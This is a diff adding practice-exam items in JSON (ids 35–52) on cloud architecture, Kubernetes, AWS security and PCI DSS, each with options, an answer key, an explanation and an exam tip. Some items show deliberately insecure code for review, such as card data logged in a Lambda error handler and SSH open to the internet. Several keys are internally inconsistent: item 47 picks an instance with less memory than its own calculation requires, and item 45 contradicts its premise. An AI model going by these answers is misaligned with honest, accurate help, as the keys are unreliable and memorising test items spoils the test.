+      "explanation": "The logs clearly indicate that the failing containers are experiencing database connection pool exhaustion issues. The specific error messages show that the connection pool limit is being reached, followed by timeout errors while waiting for available connections. This suggests that the database has a maximum connection limit, and when multiple containers try to connect simultaneously, some containers are unable to establish the necessary connections because the limit has been reached. The behavior is inconsistent because connection establishment depends on timing—containers that start earlier may acquire connections successfully, while those that start later encounter a fully utilized connection pool. Memory issues would typically manifest as OutOfMemory errors or performance degradation, not connection pool warnings. Network policy restrictions would block connections entirely rather than allowing some to succeed while others wait for pool availability. Image version mismatches would show different application version numbers in the logs, but both failing and working containers show the same version (2.3.4).",
+      "examTip": "When troubleshooting inconsistent behavior across identical containers, examine resource contention issues like connection pools, rate limits, or shared resource capacity—these often cause seemingly random failures as containers compete for limited resources even when their configurations are identical."
+    },
+    {
+      "id": 36,
+      "question": "A cloud architect is designing a solution for a financial application that processes credit card transactions. The application must comply with PCI DSS requirements and implement proper security controls. Review the architectural decisions below and identify which one violates PCI DSS compliance requirements:",
+      "options": [
+        "Implementing tokenization to store a token instead of the actual credit card number in the database",
+        "Using TLS 1.2 with strong cipher suites for all data transmission",
+        "Storing encrypted credit card security codes (CVV) for recurring transaction verification",
+        "Configuring network segmentation between cardholder data environment and other systems"
+      ],
+      "correctAnswerIndex": 2,
+      "explanation": "Storing encrypted credit card security codes (CVV) for recurring transaction verification violates PCI DSS requirements. PCI DSS specifically prohibits storing sensitive authentication data after authorization, even in encrypted form. Card security codes (CVV/CVC) are classified as sensitive authentication data and must not be stored in any form after authorization under PCI DSS Requirement 3.2. Even if encrypted, storing these codes is a direct violation of the standard. Tokenization of primary account numbers (PANs) is an accepted and recommended practice under PCI DSS, as it replaces the actual card number with a token. Using TLS 1.2 with strong cipher suites aligns with PCI DSS requirements for secure transmission of cardholder data. Network segmentation between cardholder data environments and other systems is explicitly recommended by PCI DSS to reduce the scope of the compliance requirements and improve security.",
+      "examTip": "When designing systems that handle payment card data, remember that sensitive authentication data (including CVV codes) must never be stored after authorization even if encrypted—this is a strict PCI DSS requirement that distinguishes these elements from primary account numbers, which can be stored with proper encryption."
+    },
+    {
+      "id": 37,
+      "question": "A cloud engineer is configuring a VPC network for a multi-tier application. Security requirements state that database servers must never have direct internet connectivity, application servers should only allow necessary outbound internet access, and web servers must be accessible from the internet on specific ports while maintaining high availability. Which VPC network design meets these requirements?",
+      "options": [
+        "All servers in private subnets with a load balancer in a public subnet, and a NAT gateway for outbound connectivity",
+        "Web servers in public subnets, application and database servers in private subnets with a NAT gateway for application servers",
+        "All servers in public subnets with security groups restricting unnecessary access and traffic filtering",
+        "Web and application servers in public subnets, database servers in private subnets with a transit gateway"
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": "Placing web servers in public subnets, with application and database servers in private subnets and a NAT gateway for application servers best meets the stated requirements. This design ensures that database servers have no direct internet connectivity as they're in private subnets without a route to a NAT gateway or internet gateway. Application servers in private subnets can access the internet through the NAT gateway for necessary outbound connections only, without being directly accessible from the internet. Web servers in public subnets with appropriate security groups can allow inbound traffic on specific ports while being distributed across multiple availability zones behind a load balancer for high availability. Placing all servers in private subnets wouldn't allow web servers to be directly accessible from the internet as required. Using only public subnets with security groups wouldn't satisfy the requirement that database servers must never have direct internet connectivity, as they would have routes to an internet gateway. Placing application servers in public subnets would expose them unnecessarily to potential attacks when they only need outbound access.",
+      "examTip": "When designing VPC networking for multi-tier applications with varying internet connectivity requirements, use the principle of least privilege by placing each tier in the appropriate subnet type—public subnets only for components that must accept inbound connections from the internet, and private subnets with controlled outbound access for everything else."
+    },
+    {
+      "id": 38,
+      "question": "A company is managing multiple AWS accounts through AWS Organizations. They want to implement a consistent backup policy for Amazon EBS volumes across all accounts. The backup frequency should be daily for production environments and weekly for non-production environments. They also need to ensure that recovery points are retained for 30 days for non-production and 90 days for production environments. Which solution efficiently implements these requirements with minimal operational overhead?",
+      "options": [
+        "Create a custom backup solution using Lambda functions and CloudWatch events in each account",
+        "Implement AWS Backup with account-level configurations delegated to account administrators",
+        "Deploy AWS Backup plans through Service Control Policies in AWS Organizations",
+        "Configure AWS Backup policies at the organization level with tag-based conditions for environment types"
+      ],
+      "correctAnswerIndex": 3,
+      "explanation": "Configuring AWS Backup policies at the organization level with tag-based conditions for environment types provides the most efficient solution with minimal operational overhead. AWS Backup supports organization-level backup policies that can be applied across all accounts in the organization automatically. By using tag-based conditions (like \"Environment=Production\" or \"Environment=Development\"), different backup rules can be applied to resources based on their environment type without creating separate configurations for each account. This approach ensures consistent backup policies while accommodating the different requirements for production and non-production environments. Custom backup solutions using Lambda would require significant development and maintenance across multiple accounts. Account-level configurations delegated to administrators wouldn't ensure consistency and would increase operational overhead. Service Control Policies are for permission guardrails and cannot directly implement backup functionality; they're not the appropriate mechanism for configuring AWS Backup.",
+      "examTip": "When implementing consistent operational policies across multiple accounts in AWS Organizations, leverage organization-level policy types designed for the specific service (like backup policies for AWS Backup) rather than building custom solutions or relying on account-by-account configuration—this reduces overhead and ensures consistent implementation."
+    },
+    {
+      "id": 39,
+      "question": "A cloud engineer is designing a solution that requires a secure secret management system for API keys, database credentials, and encryption keys. The solution must provide automatic rotation of credentials, fine-grained access control, and audit logging of all access attempts. Which service and configuration provides the most comprehensive security for this requirement?",
+      "options": [
+        "AWS Systems Manager Parameter Store with Standard parameters and IAM roles for access control",
+        "HashiCorp Vault with PKI authentication, dynamic secret generation, and audit device logging",
+        "Azure Key Vault with managed identities, access policies, and diagnostic settings enabled",
+        "Environment variables encrypted with KMS keys and stored in container definitions"
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": "HashiCorp Vault with PKI authentication, dynamic secret generation, and audit device logging provides the most comprehensive security for secret management. Vault offers advanced features specifically designed for enterprise secret management: PKI authentication provides strong identity verification using certificates; dynamic secret generation creates unique, short-lived credentials on demand with automatic rotation; and audit device logging records detailed information about all secret access attempts for comprehensive auditing. Vault can also manage multiple types of secrets including API keys, database credentials, and encryption keys with fine-grained access policies. AWS Systems Manager Parameter Store Standard tier lacks automatic rotation capabilities and has more limited audit logging compared to Vault. Azure Key Vault offers good security but its dynamic secret capabilities are more limited than Vault's extensive secret engines. Environment variables in container definitions, even with KMS encryption, lack rotation mechanisms and comprehensive audit logging, and expose secrets to anyone who can view the container definition or environment.",
+      "examTip": "When evaluating secret management solutions, consider the full lifecycle of secrets including generation, rotation, access control, and auditing—specialized secret management platforms typically offer more comprehensive capabilities than general configuration stores, particularly for dynamic secret generation and detailed access auditing."
+    },
+    {
+      "id": 40,
+      "question": "A company has implemented a microservices architecture using containers orchestrated by Kubernetes. During peak traffic periods, some services experience timeouts when calling dependent services, causing cascading failures across the application. The development team wants to implement a solution to improve resilience without modifying application code. Which Kubernetes-native solution best addresses this issue?",
+      "options": [
+        "Implement Horizontal Pod Autoscaling based on CPU and memory metrics",
+        "Configure a Service Mesh with circuit breaking, retry logic, and timeout management",
+        "Deploy a Node Autoscaler to increase cluster capacity during peak traffic",
+        "Use Pod Disruption Budgets to prevent voluntary disruptions during peak periods"
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": "Configuring a Service Mesh with circuit breaking, retry logic, and timeout management best addresses the issue of cascading failures in a microservices architecture without modifying application code. Service meshes (like Istio or Linkerd) implement resiliency patterns at the network proxy level, intercepting service-to-service communication. Circuit breaking prevents cascading failures by failing fast when a service is overloaded rather than allowing queued requests to time out. Retry logic with exponential backoff automatically reattempts failed requests with appropriate delays. Timeout management ensures consistent timeout behavior across service calls. These capabilities are implemented in the service mesh proxy sidecar without requiring changes to application code. Horizontal Pod Autoscaling would add more instances of services but wouldn't address the fundamental resiliency issues during the scaling period. Node Autoscaler increases cluster capacity but doesn't improve service-to-service communication resilience. Pod Disruption Budgets prevent voluntary evictions but don't address communication failures between services.",
+      "examTip": "For microservices resilience challenges like cascading failures and timeout issues, consider service mesh implementations that can add resilience patterns through proxies rather than scaling solutions alone—this approach improves reliability immediately even during the time it takes for scaling to occur."
+    },
+    {
+      "id": 41,
+      "question": "An application deployed in the cloud is experiencing intermittent performance issues. During investigation, the operations team notices a pattern of high latency that correlates with specific time periods. The application spans multiple components including web servers, application servers, and a database. To identify the root cause, the team needs to analyze performance across all components during these periods. Which monitoring approach would provide the most effective insights for this investigation?",
+      "options": [
+        "Log aggregation with full-text search and pattern recognition",
+        "Infrastructure metrics monitoring with resource utilization dashboards",
+        "Distributed tracing with end-to-end request visualization and component-level timing",
+        "Synthetic transaction monitoring with alerting on performance degradation"
+      ],
+      "correctAnswerIndex": 2,
+      "explanation": "Distributed tracing with end-to-end request visualization and component-level timing provides the most effective insights for investigating intermittent performance issues across multiple application components. This approach tracks individual requests as they flow through the entire system, measuring the time spent in each component and identifying exactly where latency is occurring. During periods of high latency, distributed tracing would show which specific component or interaction is causing the slowdown, whether it's a slow database query, an API call, or processing within a particular service. This end-to-end visibility is crucial for pinpointing bottlenecks in distributed systems. Log aggregation provides event data but typically lacks the precise timing and causal relationships between components that distributed tracing offers. Infrastructure metrics show resource utilization but may not directly correlate with request latency or identify which specific interactions are problematic. Synthetic monitoring can detect overall performance issues but doesn't provide the component-level visibility needed to identify which part of the system is causing the latency.",
+      "examTip": "When troubleshooting performance issues in distributed applications, prioritize monitoring approaches that preserve causal relationships and timing between components—distributed tracing is specifically designed for this purpose, showing exactly where time is spent as requests flow through complex systems."
+    },
+    {
+      "id": 42,
+      "question": "A cloud-native application uses containerized microservices deployed in Kubernetes. The security team needs to implement a solution that prevents containers from running with unnecessary privileges, controls what capabilities containers can use, and restricts access to host resources. Which Kubernetes security feature would best achieve these goals?",
+      "options": [
+        "Network Policies controlling pod-to-pod communication",
+        "Role-Based Access Control (RBAC) for API authorization",
+        "Pod Security Policies defining security context constraints",
+        "Secret Management for sensitive configuration data"
+      ],
+      "correctAnswerIndex": 2,
+      "explanation": "Pod Security Policies (PSPs) defining security context constraints best achieve the goals of restricting container privileges, controlling capabilities, and limiting host resource access. PSPs are specifically designed to enforce pod-level security settings by controlling aspects such as: preventing privileged containers, restricting root access, limiting container capabilities, preventing host network/PID/IPC namespace sharing, restricting volume types, and controlling host path mounts. These policies are enforced at pod creation time, ensuring that only pods meeting the defined security requirements can be deployed in the cluster. Network Policies control network communication between pods but don't address container privileges or host resource access. RBAC controls access to the Kubernetes API but doesn't directly restrict container runtime behavior or privileges. Secret Management focuses on protecting sensitive configuration data rather than controlling container security contexts or privileges.",
+      "examTip": "For controlling container security settings in Kubernetes (privileges, capabilities, host access), implement pod-level security controls like Pod Security Policies or their replacement mechanisms rather than focusing only on network restrictions or API access controls, which address different security concerns."
+    },
+    {
+      "id": 43,
+      "question": "An organization has implemented AWS Lambda functions for event processing. During a security audit, the security team raises concerns about the possibility of sensitive data being exposed in Lambda function logs, particularly in the context of error handling. Review the following Python Lambda function code and identify the security issue:\n\n```python\nimport boto3\nimport json\nimport os\n\ndef lambda_handler(event, context):\n    try:\n        # Get sensitive data from environment variables\n        api_key = os.environ['API_KEY']\n        api_secret = os.environ['API_SECRET']\n        \n        # Process the event\n        user_data = json.loads(event['body'])\n        user_id = user_data['user_id']\n        credit_card = user_data['payment']['credit_card']\n        \n        # API call to payment processor\n        response = process_payment(api_key, api_secret, user_id, credit_card)\n        \n        return {\n            'statusCode': 200,\n            'body': json.dumps({'result': 'success'})\n        }\n    except Exception as e:\n        print(f\"Error processing payment: {str(e)}, Event: {event}\")\n        return {\n            'statusCode': 500,\n            'body': json.dumps({'error': str(e)})\n        }\n```",
+      "options": [
+        "API credentials are stored as environment variables instead of using AWS Secrets Manager",
+        "Error handling logs the full event object which may contain sensitive payment information",
+        "Response includes detailed error message that could expose internal system information",
+        "Lambda function uses outdated boto3 library with known security vulnerabilities"
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": "The security issue in this Lambda function is that the error handling logs the full event object which may contain sensitive payment information. In the exception handler, the code prints the entire event object along with the error message: `print(f\"Error processing payment: {str(e)}, Event: {event}\")`. Since the event contains user payment data including credit card information (`user_data['payment']['credit_card']`), this would log sensitive card data to CloudWatch Logs in case of an error, creating a security and compliance risk. Storing API credentials in environment variables is a common practice for Lambda functions and is not inherently insecure, although Secrets Manager would provide additional security features. The error response to the client only includes the error message without the sensitive event data. There's no indication in the provided code that the boto3 library is outdated or has vulnerabilities.",
+      "examTip": "When reviewing code for security issues, pay special attention to error handling and logging practices—logging entire request objects or exceptions without filtering sensitive data is a common source of data exposure, particularly in serverless functions where logs are automatically captured by the cloud provider."
+    },
+    {
+      "id": 44,
+      "question": "A cloud engineer is designing a solution to protect data in an S3 bucket from accidental deletion or malicious destruction. The solution must prevent both accidental user deletions and protect against compromised credentials being used to delete objects. Which combination of S3 features provides the most comprehensive protection?",
+      "options": [
+        "Object versioning with MFA Delete and an IAM policy requiring multi-factor authentication",
+        "Bucket replication to a second account with object lock in compliance mode",
+        "S3 Intelligent-Tiering with archive access tiers and bucket notifications for delete events",
+        "Bucket policy restricting deletions to specific IP ranges and CloudTrail logging"
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": "Bucket replication to a second account with object lock in compliance mode provides the most comprehensive protection against both accidental deletion and malicious destruction. Cross-account replication creates a separate copy of data in another AWS account, which remains isolated from the source account's security boundary. This protects against compromised credentials in the primary account, as attackers would need to compromise both accounts to delete all copies of the data. Object lock in compliance mode prevents any user, including the root user, from deleting or overwriting objects until the retention period expires, providing protection against both accidental and intentional deletion. Object versioning with MFA Delete provides good protection but remains within a single account's security boundary, making it vulnerable if account credentials are fully compromised. S3 Intelligent-Tiering primarily addresses storage cost optimization rather than deletion protection. Bucket policies restricting deletions by IP address can be bypassed if credentials are stolen and used from allowed IP ranges.",
+      "examTip": "For maximum protection against data deletion in cloud storage, implement solutions that combine multiple security boundaries (like cross-account replication) with immutability controls (like compliance mode object locks)—this defense-in-depth approach protects against both accidental errors and sophisticated attacks with compromised credentials."
+    },
+    {
+      "id": 45,
+      "question": "A company has implemented a serverless architecture for their e-commerce platform. The architecture includes API Gateway, Lambda functions, DynamoDB, and S3. The platform is experiencing intermittent performance issues where some customer checkout processes take significantly longer than others, despite similar cart contents. The operations team has collected the following data points:\n\n- Lambda CloudWatch Logs show occasional cold starts with 1-2 second initialization times\n- DynamoDB consumption metrics indicate no throttling events\n- API Gateway latency metrics are consistent\n- Some checkout Lambda functions show execution times of 8-10 seconds vs normal 2-3 seconds\n\nA code review of the checkout Lambda function reveals the following structure:\n\n```javascript\nexports.handler = async (event) => {\n  // Initialize SDK clients and connections\n  const dynamodb = new AWS.DynamoDB.DocumentClient();\n  const s3 = new AWS.S3();\n  const sns = new AWS.SNS();\n  \n  // Process order\n  const items = JSON.parse(event.body).items;\n  \n  // Check inventory and reserve stock\n  for (const item of items) {\n    await dynamodb.update({\n      TableName: 'inventory',\n      Key: { 'itemId': item.id },\n      UpdateExpression: 'SET availableStock = availableStock - :quantity',\n      ConditionExpression: 'availableStock >= :quantity',\n      ExpressionAttributeValues: { ':quantity': item.quantity }\n    }).promise();\n  }\n  \n  // Generate invoice and store in S3\n  const invoice = generateInvoice(items);\n  await s3.putObject({\n    Bucket: 'invoices',\n    Key: `${orderId}.pdf`,\n    Body: invoice\n  }).promise();\n  \n  // Send confirmation notification\n  await sns.publish({\n    TopicArn: 'arn:aws:sns:region:account:order-notifications',\n    Message: JSON.stringify({ orderId, status: 'confirmed' })\n  }).promise();\n  \n  return { statusCode: 200, body: JSON.stringify({ success: true }) };\n};\n```\n\nWhat is the most likely cause of the intermittent performance issues?",
+      "options": [
+        "Lambda cold starts causing initialization delays for some customer requests",
+        "Network latency between Lambda and DynamoDB in different availability zones",
+        "Sequential processing of inventory updates creating unnecessary wait times",
+        "S3 throttling during peak periods when multiple invoices are being generated"
+      ],
+      "correctAnswerIndex": 2,
+      "explanation": "The most likely cause of the intermittent performance issues is sequential processing of inventory updates creating unnecessary wait times. The code shows a loop that awaits each DynamoDB update operation individually before proceeding to the next item: `for (const item of items) { await dynamodb.update(...).promise(); }`. This synchronous, sequential processing means that checkout time increases linearly with the number of items in a cart. Orders with more items would take longer to process, explaining the intermittent nature of the issue where some checkouts take 8-10 seconds while others take 2-3 seconds despite similar cart contents (but likely different numbers of items). Lambda cold starts would affect all functions similarly and the logs show only 1-2 second initialization times, not explaining the 8-10 second outliers. DynamoDB metrics show no throttling, ruling out database performance issues. Network latency would typically show more consistent patterns rather than the specific correlation with certain checkouts. S3 operations occur only once per checkout for storing the invoice, so this wouldn't vary based on cart item count.",
+      "examTip": "When troubleshooting serverless performance issues, look closely at code patterns that create unnecessary sequential processing—a common anti-pattern is awaiting each iteration in a loop rather than processing operations in parallel, which can cause execution time to scale linearly with input size."
+    },
+    {
+      "id": 46,
+      "question": "A cloud architect is designing a data processing pipeline for a financial institution. The pipeline must process sensitive customer transaction data with the following requirements:\n\n- Data must remain encrypted throughout the entire pipeline\n- Encryption keys must be rotated automatically every 30 days\n- All key usage must be logged for audit purposes\n- Pipeline components need access to decrypt data for processing without human intervention\n\nWhich combination of AWS services best satisfies these requirements?",
+      "options": [
+        "S3 with default encryption, Lambda functions with environment variables for credentials, and CloudTrail logging",
+        "KMS with automatic key rotation, IAM roles for service access, and CloudWatch Logs for key usage",
+        "CloudHSM with custom key management, Secrets Manager for distribution, and Kinesis Data Firehose for processing",
+        "KMS with customer managed keys, automatic rotation enabled, service roles with key permissions, and AWS CloudTrail for API logging"
+      ],
+      "correctAnswerIndex": 3,
+      "explanation": "KMS with customer managed keys, automatic rotation enabled, service roles with key permissions, and AWS CloudTrail for API logging best satisfies all the stated requirements. Customer managed keys (CMKs) in KMS can be configured with automatic rotation every 30 days, ensuring keys are regularly rotated without manual intervention. Service roles can be granted specific permissions to use the KMS keys for encryption and decryption, allowing pipeline components to access encrypted data without human involvement. AWS CloudTrail automatically logs all KMS API calls, including key usage operations, providing a comprehensive audit trail for compliance purposes. The data can remain encrypted throughout the pipeline while still being accessible to authorized services through the KMS encryption/decryption APIs. S3 with default encryption doesn't provide the granular key rotation and logging capabilities required. Lambda with environment variables isn't a secure method for storing credentials. CloudHSM provides hardware security but requires more complex custom key management that's not necessary for this scenario. KMS with automatic key rotation and proper service access implementation is purpose-built for this exact use case.",
+      "examTip": "For data encryption requirements involving automatic key rotation, service-based access, and comprehensive audit logging, AWS KMS with customer managed keys typically provides the most straightforward implementation—it handles key rotation, access control, and audit logging as built-in features specifically designed for service-to-service encryption."
+    },
+    {
+      "id": 47,
+      "question": "A cloud administrator notices excessive costs in their AWS environment stemming from over-provisioned EC2 instances. After collecting the following metrics from CloudWatch for the past 30 days, they need to determine which instances should be rightsized:\n\n| Instance ID | Type | vCPU | Memory (GiB) | Max CPU (%) | Average CPU (%) | Max Memory (%) | Average Memory (%) | Monthly Cost |\n|------------|------|------|--------------|------------|----------------|----------------|-------------------|-------------|\n| i-1a2b3c4d | c5.2xlarge | 8 | 16 | 45% | 12% | 85% | 72% | $140 |\n| i-2b3c4d5e | r5.xlarge | 4 | 32 | 78% | 65% | 42% | 30% | $190 |\n| i-3c4d5e6f | m5.2xlarge | 8 | 32 | 30% | 18% | 28% | 22% | $230 |\n| i-4d5e6f7g | t3.medium | 2 | 4 | 92% | 82% | 88% | 75% | $30 |\n\nWhich instance should be prioritized for rightsizing to optimize cost without risking performance degradation?",
+      "options": [
+        "i-1a2b3c4d (c5.2xlarge) should be downsized to a c5.large instance",
+        "i-2b3c4d5e (r5.xlarge) should be changed to a c5.xlarge instance",
+        "i-3c4d5e6f (m5.2xlarge) should be downsized to a m5.large instance",
+        "i-4d5e6f7g (t3.medium) should be upsized to a t3.large instance"
+      ],
+      "correctAnswerIndex": 2,
+      "explanation": "Instance i-3c4d5e6f (m5.2xlarge) should be prioritized for rightsizing to an m5.large instance. This instance shows consistently low utilization for both CPU and memory: 30% max CPU usage and 28% max memory usage, with averages of just 18% CPU and 22% memory. These utilization levels indicate significant over-provisioning. An m5.large has 2 vCPUs and 8 GiB of memory, which would still provide sufficient capacity for the observed workload (30% of 8 vCPUs = 2.4 vCPUs needed; 28% of 32 GiB = ~9 GiB memory needed). This rightsizing would reduce costs substantially while maintaining adequate performance headroom. Instance i-1a2b3c4d has low CPU usage but high memory usage (85% max), making it risky to downsize significantly. Instance i-2b3c4d5e has relatively high CPU usage (78% max, 65% average), which could risk performance issues if downsized. Instance i-4d5e6f7g shows very high utilization of both CPU and memory (92% CPU, 88% memory) and actually might benefit from upsizing rather than downsizing.",
+      "examTip": "When prioritizing instances for rightsizing, focus on those with consistently low utilization across all resource dimensions (CPU, memory, network, etc.) and significant cost impact—the most efficient cost optimization comes from addressing instances that are both expensive and substantially over-provisioned relative to their actual resource consumption."
+    },
+    {
+      "id": 48,
+      "question": "A company uses infrastructure as code with AWS CloudFormation for all their deployments. During a security review, the team discovers that some EC2 instances have been launched with overly permissive security groups. After investigating, they find the following template snippet responsible for creating the security groups:\n\n```yaml\nResources:\n  WebServerSecurityGroup:\n    Type: 'AWS::EC2::SecurityGroup'\n    Properties:\n      GroupDescription: Enable web access\n      SecurityGroupIngress:\n        - IpProtocol: tcp\n          FromPort: 80\n          ToPort: 80\n          CidrIp: 0.0.0.0/0\n        - IpProtocol: tcp\n          FromPort: 443\n          ToPort: 443\n          CidrIp: 0.0.0.0/0\n        - IpProtocol: tcp\n          FromPort: 22\n          ToPort: 22\n          CidrIp: 0.0.0.0/0\n```\n\nWhat is the most effective way to enforce security best practices across all CloudFormation deployments to prevent similar issues in the future?",
+      "options": [
+        "Implement a pre-commit hook in the Git repository to validate templates before they're committed",
+        "Create AWS Config rules to detect and remediate non-compliant security groups after deployment",
+        "Deploy CloudFormation Guard with custom rules enforced in the CI/CD pipeline before deployment",
+        "Add explicit Deny statements in IAM policies to prevent creation of insecure security groups"
+      ],
+      "correctAnswerIndex": 2,
+      "explanation": "Deploying CloudFormation Guard with custom rules enforced in the CI/CD pipeline before deployment provides the most effective prevention mechanism. CloudFormation Guard is a policy-as-code evaluation tool specifically designed for validating CloudFormation templates against security and compliance rules before deployment. By integrating Guard into the CI/CD pipeline with custom rules that specifically check for overly permissive security group configurations (like SSH open to 0.0.0.0/0), problems can be identified and blocked before deployment occurs, preventing non-compliant resources from ever being created. Pre-commit hooks are useful but only work when developers remember to commit through the standard process, creating potential bypass opportunities. AWS Config rules operate after deployment, allowing non-compliant resources to exist temporarily until remediation occurs, which doesn't prevent the initial security exposure. IAM Deny policies are difficult to craft precisely for this scenario and would prevent legitimate security group uses, causing operational issues without addressing the root cause of poorly configured templates.",
+      "examTip": "When implementing preventative security controls for infrastructure as code, prioritize automated validation in the deployment pipeline over post-deployment detection or manual processes—this shift-left approach catches issues before they reach production while providing immediate feedback to developers."
+    },
+    {
+      "id": 49,
+      "question": "A cloud engineer is troubleshooting performance issues in a containerized application deployed on Kubernetes. Users report intermittent high latency during API calls. During investigation, the engineer collects the following observations:\n\n1. CPU and memory utilization on nodes are within normal ranges (30-60%)\n2. Network throughput shows no signs of congestion\n3. The application uses a shared Redis cache for session storage\n4. Kubernetes events show frequent pod restarts for some application instances\n5. Container logs show occasional timeouts when connecting to Redis\n\nThe Redis pod configuration is as follows:\n\n```yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: redis-cache\n  labels:\n    app: redis\nspec:\n  containers:\n  - name: redis\n    image: redis:6.2\n    resources:\n      requests:\n        memory: \"128Mi\"\n        cpu: \"100m\"\n      limits:\n        memory: \"256Mi\"\n        cpu: \"200m\"\n    ports:\n    - containerPort: 6379\n```\n\nWhat is most likely causing the intermittent performance issues?",
+      "options": [
+        "The application code contains inefficient Redis query patterns causing high latency",
+        "Redis container memory limits are too low for the application's cache requirements",
+        "Network policies are restricting traffic between application pods and the Redis pod",
+        "The Redis image version has known performance bugs under high concurrency"
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": "The Redis container memory limits are too low for the application's cache requirements, which is most likely causing the intermittent performance issues. The symptoms indicate a memory constraint in Redis: container logs show occasional timeouts connecting to Redis, and Kubernetes events show frequent pod restarts for some application instances. Redis is memory-intensive by design, and when it reaches its memory limit (256Mi in this case), it can trigger performance degradation, connection timeouts, or even be terminated by Kubernetes OOM killer, causing pod restarts. This explains the intermittent nature of the issues as they would occur when memory usage spikes during periods of higher activity or larger data sets. The application's CPU and node memory being within normal ranges points away from application-level resource constraints. There's no indication of network congestion or network policy issues mentioned in the observations. No specific Redis version bugs are mentioned, and version 6.2 is a stable release without widely known performance issues under normal conditions.",
+      "examTip": "When troubleshooting intermittent performance issues in containerized applications, analyze resource constraints—especially memory limits—for critical shared services like caches and databases. Memory constraints often manifest as timeouts and restarts rather than obvious errors, making them harder to diagnose than CPU limitations."
+    },
+    {
+      "id": 50,
+      "question": "A company has implemented a hybrid cloud architecture with workloads running both on-premises and in AWS. They need to establish secure, reliable network connectivity between environments that meets the following requirements:\n\n- High bandwidth (>1 Gbps)\n- Low latency (<10ms)\n- Redundant connections\n- No traversal of the public internet\n- Ability to grow to 10 Gbps within the next year\n\nTheir on-premises data center is located 15 miles from the nearest AWS region. Current on-premises network consists of redundant 10 Gbps connections to two different ISPs. Which AWS connectivity solution best meets these requirements?",
+      "options": [
+        "VPN connections over both ISPs with VPN CloudHub for redundancy",
+        "AWS Direct Connect with dual 1 Gbps connections from different locations",
+        "AWS Transit Gateway connecting to both AWS VPN and Direct Connect",
+        "AWS Site-to-Site VPN with accelerated routing enabled"
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": "AWS Direct Connect with dual 1 Gbps connections from different locations best meets all the stated requirements. Direct Connect provides dedicated private connectivity that doesn't traverse the public internet, consistently delivering low latency (<10ms) when the data center is physically close to an AWS region (15 miles in this case). Implementing dual 1 Gbps connections from different locations provides the required bandwidth (>1 Gbps) with physical redundancy to ensure high availability. Direct Connect circuits can be easily upgraded to 10 Gbps to accommodate future growth requirements without architectural changes. VPN connections over ISPs would traverse the public internet, which violates the requirement for private connectivity and wouldn't provide the same consistent low latency as Direct Connect. Transit Gateway with both VPN and Direct Connect adds unnecessary complexity if Direct Connect alone can meet the requirements, and the VPN component would still traverse the internet. Site-to-Site VPN with accelerated routing would still use the public internet, even with performance optimizations, and typically has bandwidth limitations below the future 10 Gbps requirement.",
+      "examTip": "When designing hybrid cloud connectivity solutions with strict performance and privacy requirements, prioritize dedicated private connections (like Direct Connect) over encrypted internet connections (like VPN)—while both provide secure connectivity, only dedicated circuits deliver consistent performance with true private network characteristics."
+    },
+    {
+      "id": 51,
+      "question": "A security engineer is reviewing logs for a cloud-native application and notices a series of API calls that successfully accessed multiple storage buckets despite originating from an unusual IP range. The calls used valid credentials for a service account that should only be used by application instances. Examining the OAuth token used for authentication reveals the following claims:\n\n```json\n{\n  \"aud\": \"https://api.cloud.example.com\",\n  \"iss\": \"https://sts.example.org\",\n  \"sub\": \"service-account-01@example.com\",\n  \"iat\": 1649845200,\n  \"exp\": 1649848800,\n  \"jti\": \"f7eb86a9c8a25b2f\",\n  \"scope\": \"storage.read storage.write\",\n  \"client_id\": \"app-backend-prod-01\"\n}\n```\n\nWhich security vulnerability most likely led to this potential compromise?",
+      "options": [
+        "The service account private key was exposed in a public code repository",
+        "Credentials were leaked by a metadata service endpoint accessible from the container",
+        "The application is using a shared OAuth client secret across multiple environments",
+        "Token validation is not checking the issuer field against an allowed list"
+      ],
+      "correctAnswerIndex": 0,
+      "explanation": "The most likely vulnerability is that the service account private key was exposed in a public code repository. The scenario describes valid credentials being used from an unusual IP range to access storage buckets with a service account that should only be used by application instances. This strongly suggests credential theft rather than a configuration issue. The OAuth token itself appears valid (contains expected fields including issuer, subject, expiration, etc.) and is properly formatted, indicating the attacker obtained legitimate credentials rather than bypassing authentication. Private keys committed to public repositories are a common source of credential theft, allowing attackers to authenticate as the service account from any location. Metadata service exposure would typically allow attackers to access tokens from within the same cluster or network, not from unusual external IP ranges. A shared OAuth client secret might enable accessing other environments but wouldn't directly explain unusual source IPs using a production service account. Token validation issues would appear as malformed or manipulated tokens rather than valid ones with normal claims.",
+      "examTip": "When investigating potential security incidents involving service accounts, examine whether the authentication itself was compromised (stolen credentials) or if authorization controls failed (overly permissive policies)—valid tokens from unexpected sources strongly suggest credential theft rather than configuration vulnerabilities."
+    },
+    {
+      "id": 52,
+      "question": "An organization uses AWS for their production workloads with multiple accounts managed through AWS Organizations. They need to enforce security policies that prevent the creation of public S3 buckets across all accounts, including any new accounts that join the organization in the future. Review the following Service Control Policy (SCP) and identify what prevents it from functioning correctly:\n\n```json\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Sid\": \"DenyPublicS3Buckets\",\n      \"Effect\": \"Deny\",\n      \"Action\": [\n        \"s3:PutBucketPublicAccessBlock\"\n      ],\n      \"Resource\": \"*\",\n      \"Condition\": {\n        \"StringEquals\": {\n          \"s3:PublicAccessBlockConfiguration\": \"false\"\n        }\n      }\n    }\n  ]\n}\n```",
+      "options": [
+        "The policy restricts setting public access blocks rather than preventing public access",
+        "The condition should use a StringNotEquals operator instead of StringEquals",
+        "The resource field should specify bucket ARNs instead of using the wildcard",
+        "The policy is missing the s3:CreateBucket action to block bucket creation"
+      ],
+      "correctAnswerIndex": 0,
